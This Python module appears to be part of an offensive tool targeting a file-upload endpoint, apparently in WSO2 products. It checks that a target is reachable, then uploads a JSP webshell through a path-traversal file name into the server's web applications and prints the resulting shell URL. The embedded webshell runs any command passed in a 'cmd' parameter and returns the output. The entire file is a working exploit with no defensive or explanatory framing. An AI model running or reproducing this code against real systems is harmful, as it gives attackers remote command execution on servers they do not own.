from requests import get, post, exceptions
from rich import print
from urllib3 import disable_warnings

from src.wsob.helpers.settings import props

disable_warnings()

def start(args) -> None:
    " Check if target passed is alive "

    try:
        response: str = get(args.u, **props)
        status_code: str = response.status_code
        status_error: str = f"[bold white on red][-] Host returned status code: {status_code}"

        if response.ok:
            exploit(args)
        else:
            return print(status_error)

    except exceptions as error:
        return print(f"[red]> Error when trying to connect to host: {args.u} | {error} [/]")


def exploit(args) -> None:
    " Exploit the vulnerability "

    print("\n[green][+] Connected succesfully, trying to upload JSP webshell...")

    webshell = """<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
        <pre><%=output %></pre>"""

    shell = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/authendpoint.jsp": webshell}
    upload = post(f"{args.u}/fileupload/toolsAny", files=shell, **props)
    status_code = upload.status_code

    if not status_code == 200:
        print("[red][-] Target is not vulnerable [/]")
    else:
        print(f"[yellow][!] Upload status code: {status_code} [/]")
        print(f"[green][+] Webshell path: {args.u}/authenticationendpoint/authendpoint.jsp [/]")